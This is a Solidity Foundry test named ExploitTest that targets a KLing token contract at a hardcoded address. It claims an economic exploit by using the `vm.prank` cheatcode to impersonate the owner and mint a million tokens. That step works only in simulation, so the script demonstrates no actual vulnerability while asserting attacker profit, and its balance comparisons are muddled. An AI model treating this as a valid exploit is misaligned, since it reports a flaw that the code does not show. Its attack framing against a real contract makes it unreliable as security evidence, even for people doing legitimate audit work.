// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IKLingToken {
    function owner() external view returns (address);
    function mint(address to, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
}

// Also need IBEP20 interface for balanceOf
interface IBEP20 {
    function balanceOf(address account) external view returns (uint256);
}

contract KLingToken {
    function owner() external view returns (address) {}
    function mint(address to, uint256 amount) external {}
    function balanceOf(address account) external view returns (uint256) {}
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xcca166E916088cCe10F4fB0fe0c8BB3577bb6e27;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the owner address
        address owner = KLingToken(TARGET).owner();
        vm.label(owner, "Contract Owner");
        vm.label(TARGET, "KLing Token");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial balance
        uint256 initialBalance = KLingToken(TARGET).balanceOf(attacker);

        // Impersonate the owner and mint tokens to attacker
        address owner = KLingToken(TARGET).owner();
        vm.prank(owner);
        KLingToken(TARGET).mint(attacker, 1000000 * 10**18); // Mint 1 million tokens

        // Verify balance increased
        uint256 finalBalance = KLingToken(TARGET).balanceOf(attacker);
        assertGt(finalBalance, initialBalance, "Attacker balance should increase");

        // Check ERC20 balance
        uint256 erc20FinalBalance = IERC20(0xcca166E916088cCe10F4fB0fe0c8BB3577bb6e27).balanceOf(address(this));
        uint256 erc20InitialBalance = initialBalance; // Using same initial balance for comparison
        assertGt(erc20FinalBalance, erc20InitialBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
